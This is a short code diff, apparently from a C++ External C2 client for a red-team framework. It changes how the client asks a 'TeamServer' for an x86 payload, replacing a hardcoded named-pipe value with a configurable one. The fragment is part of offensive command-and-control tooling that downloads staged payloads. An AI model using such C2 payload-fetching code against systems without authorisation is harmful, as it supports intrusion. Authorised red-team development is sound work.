@@ -130,7 +130,8 @@ std::vector<uint8_t> getx86Payload(SOCKET socket_extc2) {
 	std::cout << "[>] Getting x86 payload from TeamServer" << std::endl;
 
 	send_frame(socket_extc2, (char*)"arch=x86", 8);
-	send_frame(socket_extc2, (char*)"pipename=foobar", 15);
+	//send_frame(socket_extc2, (char*)"pipename=foobar", 15);
+	send_frame(socket_extc2, (char *)("pipename=" + TeamServer::pipeName).c_str(), ("pipename=" + TeamServer::pipeName).size());
 	send_frame(socket_extc2, (char*)"block=100", 9);
 
 	/*
